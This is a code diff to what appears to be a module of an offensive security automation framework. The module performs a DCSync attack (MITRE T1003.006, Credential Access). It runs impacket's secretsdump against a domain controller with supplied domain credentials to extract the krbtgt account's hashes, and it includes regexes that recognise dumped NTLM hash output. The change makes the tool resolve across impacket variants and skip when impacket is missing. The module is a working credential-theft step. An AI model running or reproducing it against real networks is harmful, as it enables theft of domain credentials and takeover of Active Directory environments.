@@ -32,7 +32,8 @@ META = {
     "mitre": ['T1003.006'],
     "cwe": [],
     "tactic": 'Credential Access',
-    "requires": ["impacket-secretsdump"],
+    "requires": [],                 # resolved at runtime across impacket flavours
+    "requires_py": ["impacket"],    # the real dependency (CLI name varies)
     "ports": [("tcp", 445), ("tcp", 135)],
     "success_regex": r"aad3b435|:::|krbtgt:|Kerberos keys grabbed",
     "blocked_regex": r"timed out|Connection refused|unreachable|Errno|STATUS_",
@@ -81,6 +82,10 @@ def _run_in_process(target, ctx):
 def run(target, ctx):
     if _portpatch.is_custom_port_target(target):
         return _run_in_process(target, ctx)
+    from modules import _impacket
+    tool = _impacket.resolve("secretsdump")
+    if not tool:
+        return ("# dcsync vs %s\n\n[SKIP] impacket not installed — secretsdump "
+                "unavailable (pip install impacket / apt python3-impacket)." % target)
     return ctx.run_cmd(
-        "impacket-secretsdump {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt",
-        target)
+        tool + " {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt", target)
